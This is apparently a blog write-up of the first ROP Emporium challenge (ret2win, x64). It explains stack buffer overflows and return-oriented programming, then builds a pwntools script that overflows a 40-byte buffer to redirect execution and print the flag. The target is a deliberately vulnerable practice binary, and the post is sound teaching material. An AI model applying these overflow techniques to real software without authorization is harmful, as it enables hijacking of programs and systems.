---
layout: post
title:  "ROP Emporium ret2win Writeup (x64)"
date:   2024-05-31 13:15:45 -0400
categories: rop-emporium challenge-1
tags: rop-emporium ret2win x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[first challenge](https://ropemporium.com/challenge/ret2win.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### What is Return Oriented Programming?
#### Buffer Overflows
When a program needs to write data to memory,
it will need to reserve a space for that data to be stored
(a buffer).
As long as the data being written is less than or equal
to the buffer size, things are fine.

But what happens when the data being written is larger
than the buffer? Once the reserved space is filled, the program
will continue writing past the buffer. If it's located
on the stack, it will overwrite key values the program
needs to run as intended. 

One of these values sets the `instruction pointer`.
This tells the program the location of the next
instructions to execute. Whenever a function returns,
it will `pop` a value off of the stack and set that
to the instruction pointer.
By controlling this value, we essentially control 
the flow of the program.

![stack-bof](/images/ret2win/stack-bof.png)

How can we abuse this? First we write instructions into the
buffer. Then we force the instruction pointer (`EIP` in
the image) to point
to that buffer. This will make the next instructions
the program runs completely controlled by the attacker.
We've achieved arbitrary code execution!

But as attacks improve so do defenses. When compiled
with a non executable stack, the program no longer
executes code in locations that can be written to.
This fixes the described
[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow){:target="_blank"}{:rel="noopener noreferrer"}
vulnerability, but we
still have enough resources to achieve arbitrary
code execution...

#### Return Oriented Programming
Rather than injecting our own instructions, we can
reuse the instructions that are already there! The
catch is we can only use a block of instructions
that end in a `ret` instruction. This is where
the `Return` part of `Return Oriented Programming`
gets its name! 

What makes the `ret` instruction so special? If you
recall, the instruction pointer only gets updated 
when a function returns. If we want to run the 
following instructions

```nasm
pop rax
pop rbx
mov [rax], rbx
```

it may not exist in the binary in that form. However,
if we can find each individual instruction somewhere
in the binary followed by a `ret`, we can chain
these blocks together essentially achieving
the same result

```nasm
pop rbx
ret
...
mov [rax], rbx
ret
...
pop rax
ret
```

These blocks of instructions which end in a `ret` 
instruction are also known as `gadgets`.

So by reusing instructions found before a `ret` instruction
we can chain an arbitrary number of gadgets to complete
almost any task. There will be limitations based on
the stack size, the available gadgets, as well as
a hacker's ability to find a non trivial path, but that's
where the fun is!

## Tools
To make exploit development easier I'll be using
the following tools for all challenges

[Radare2](https://github.com/radareorg/radare2){:target="_blank"}{:rel="noopener noreferrer"}
is a powerful commandline tool which makes
binary analysis and reverse engineering easier. It'll
help us find useful gadgets and addresses.

[Pwndbg](https://github.com/pwndbg/pwndbg){:target="_blank"}{:rel="noopener noreferrer"}
is a plugin for GDB which helps exploit developing.
This will make it easier to see how our payload changes
the control flow of the vulnerable program.

[Pwntools](https://github.com/Gallopsled/pwntools){:target="_blank"}{:rel="noopener noreferrer"}
is a python library which will be used to
build and send our payload to the vulnerable program.

## Program Protections
Since this is a ROP challenge we know the stack won't
be executable. Just to be sure we can run
```bash
checksec ret2win
```
![checksec](/images/ret2win/x64-checksec.png)

The `NX` flag is set meaning you can't execute code from
a writable part of memory. We're also dealing with
a 64 bit binary using little endian.

> This will be the same for every challenge
{: .prompt-info }

## Buffer Size
> Use the `cyclic` function and command in `pwntools`
> and `pwndbg`
{: .prompt-tip }
We need to know how big the buffer is before we start
overwriting the instruction pointer. We can use the
`cyclic()` function from pwntools to find the exact
offset. We just need to run the following
```python
#!/bin/python3
from pwn import *

# set terminal gdb will run in
# replace 'kitty' with your terminal
# context.terminal = ['kitty']

# create payload
payload = cyclic(60, n=8)

# debug rop chain
io = gdb.debug('./ret2win', '''
               b pwnme
               c
               ''')
io.sendline(payload)

# keep the program alive
io.interactive()
```
The python code will stop when the pwnme function is
called. Continue the program with `continue` and
wait for the program to crash. To get the offset we
can run
```
cyclic -l 0x6161616161616166 -n 8
```
![offset](/images/ret2win/x64-offset.png)

Our offset is 40 bytes. After this, we're able to control
where the program will return to.

> This will be the same for every x64 challenge
{: .prompt-info }


## Exploit Crafting
According to the
[challenge page](https://ropemporium.com/challenge/ret2win.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call the function `ret2win`
### Function Address
> You can use radare2 to list function addresses
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. To list functions with their
addresses we can run `afl`
![ret2win-addr](/images/ret2win/x64-ret2win-addr.png)

So the address of `sym.ret2win` is `0x00400756`

### Debugging
We should have everything we need to build the exploit
```python
#!/bin/python3
from pwn import *

# create payload
ret2win_addr = 0x00400756
# fill buffer + rbp
payload = b'A'*40
# adds the proper 64 bit padding
# and uses little endian
payload += p64(ret2win_addr)

# send payload
io = process('./ret2win')
io.sendline(payload)

# retrieve output
print(io.recvall())
```

![missing-flag](/images/ret2win/x64-missing-flag.png)

When we run this we reach the `ret2win` function
since the text `Here's your flag:` is printed to
the screen, but the flag isn't printed. What's
going on?

> The answer is in the `Common pitfalls` section
> in the [Beginners' guide](https://ropemporium.com/guide.html){:target="_blank"}{:rel="noopener noreferrer"}
{: .prompt-tip }


The x64 calling convention requires the stack to be
16 byte aligned when calling certain functions. Using
`radare2` we can check what instructions are being
run at this address

```
s sym.ret2win
V
p
```
![ret2win-asm](/images/ret2win/x64-ret2win-asm.png)

The address we're jumping to, `0x00400756`, executes
a `push` instruction which places a value onto the
stack. This is likely misaligning the stack and
causing the a crash when `system` is called.

To solve this, we can just change the address we
return to! If we skip the `push` instruction
entirely our stack should be properly aligned
for the `system` call.

## Exploit
By fixing the address our final exploit becomes
```python
#!/bin/python3
from pwn import *

# create payload
ret2win_addr = 0x00400756
payload = b'A'*40
# return to mov rbp, rsp
# rather than pop rbp
payload += p64(ret2win_addr + 1)

# send payload
io = process('./ret2win')
io.sendline(payload)

# retrieve flag
io.recvuntil(b'flag:\n')
flag = io.recvline()
success(flag)
```
![flag](/images/ret2win/x64-flag.png)

## Conclusion
This challenge is fairly straightforward but being able
to control the `instruction pointer` is the
basis for all challenges going forward. Since the goal
of ROP Emporium is to teach ROP in isolation, all
`x64` challenges will use the same offset
of `40 bytes` and will have the same compiled protections.
For the sake of brevity, I won't go over finding the
protections and offset in every challenge.

[Next Challenge (split)]({% post_url 2024-06-01-rop-emporium-split-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[ret2win x86]({% post_url 2024-05-31-rop-emporium-ret2win-x86%}){:target="_blank"}{:rel="noopener noreferrer"}
